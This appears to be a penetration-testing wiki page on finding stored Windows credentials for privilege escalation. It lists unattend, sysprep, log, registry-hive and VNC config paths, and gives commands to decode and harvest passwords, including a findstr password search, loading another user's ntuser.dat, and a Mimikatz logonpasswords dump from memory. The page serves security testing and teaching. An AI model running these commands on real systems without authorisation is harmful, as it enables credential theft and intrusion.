# Unattended Install Files (Cleartext Passwords)

1. C:\unattend.xml

2. C:\Windows\Panther\Unattend.xml

3. C:\Windows\Panther\Unattend\Unattend.xml

4. C:\Windows\system32\sysprep.inf

5. C:\Windows\system32\sysprep\sysprep.xml

>  These files often store local admin passwords or domain join credentials in cleartext or base64-encoded:
>Example from `unattend.xml`:

```xml
<Password>
    <Value>U3VwZXJTZWNyZXQxMjMh</Value> <!-- Base64 encoded -->
    <PlainText>true</PlainText>
</Password>
```

- Decode Base64 with PowerShell:

```powershell
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3VwZXJTZWNyZXQxMjMh"))
```


## Log Files and System Files

6. %SYSTEMDRIVE%\pagefile.sys – Potentially contains sensitive data in memory dumps.

7. %WINDIR%\debug\NetSetup.log – May contain domain join credentials.

8. %WINDIR%\iis6.log – Can expose web app credentials or session info.


> Example from `NetSetup.log`:

```text
2025/03/28 12:34:56 Machine joined to domain INFOWARRIOR.LOCAL using credentials: Administrator/Th1sIsSup3rS3cr3t
```

## Event Logs and Config Files

13. %WINDIR%\system32\config\AppEvent.Evt

14. %WINDIR%\system32\config\SecEvent.Evt

15. %WINDIR%\system32\config\default.sav

16. %WINDIR%\system32\config\security.sav

17. %WINDIR%\system32\config\software.sav

18. %WINDIR%\system32\config\system.sav


> Event logs might capture failed logins or successful authentication attempts.
> Extract with PowerShell:

```powershell
Get-WinEvent -LogName Security | Where-Object {$_.ID -eq 4624}
```


## Remote Management Credentials

19. %WINDIR%\system32\CCM\logs\*.log – May contain SCCM deployment credentials.

20. %USERPROFILE%\ntuser.dat – Holds registry settings for the user.

21. %USERPROFILE%\LocalS1\Tempor1\Content.IE5\index.dat – Stores browser history and saved credentials.
  

> Extract NTUSER.DAT settings:

```powershell
reg load HKU\TempUser C:\Users\<username>\ntuser.dat
reg query HKU\TempUser
```

## VNC Config Files (Saved Passwords)

22. dir c:*vnc.ini /s /b

23. dir c:*ultravnc.ini /s /b

> Example from `ultravnc.ini`:

```ini
[admin]
passwd=1234567890abcdef
```

> Decode VNC passwords with `vncpwd.exe` or a similar tool.


##  Pro Tips:

- Use `findstr` to quickly search for `password`, `user`, `token`, `key`, etc.:

```cmd
findstr /si password c:\*.xml c:\*.ini c:\*.log
```

- Use `Mimikatz` to extract credentials from memory:

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

## Related
- [Password Mining](Password-Mining.md) — parent hub
- [Web Configuration Files and Sensitive Data Discovery](Web-Configuration-Files-and-Sensitive-Data-Discovery.md) — sibling cleartext-credential source
- [Search for file contents](Search-for-file-contents/Search-for-file-contents.md) — searching the filesystem for secrets
- [Windows Privilege Escalation](../README.md) — escalation context
